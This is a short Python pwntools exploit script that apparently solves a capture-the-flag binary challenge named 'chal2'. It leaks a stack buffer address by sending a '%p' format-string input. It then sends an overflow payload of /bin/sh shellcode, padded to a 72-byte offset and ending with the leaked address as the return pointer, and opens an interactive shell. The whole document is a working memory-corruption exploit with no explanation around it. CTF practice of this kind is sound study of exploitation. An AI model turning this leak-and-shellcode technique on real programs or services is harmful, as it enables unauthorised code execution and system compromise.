#!/usr/bin/env python3 
from pwn import *

context.update(arch='amd64', os='linux')
# context.log_level = "debug"

chall = "./chal2"
p = process(chall)

emoji1 = b"\xf0\x9f\xa7\x91"  # 🧑
emoji2 = b"\xf0\x9f\x90\xa6"  # 🐦


# buf address leak
p.sendlineafter(emoji1 + b" > ", b"%p")
p.recvuntil(emoji2 + b" > ")
leak = int(p.recvuntil(emoji1, drop=True).strip(), 16)
log.info("leak: " + hex(leak))


# exec shellcode
offset = 72
shellcode = asm(shellcraft.sh())
payload = shellcode + b"B" * (offset - len(shellcode)) + p64(leak)
p.sendlineafter(b"> ", payload)

p.interactive()
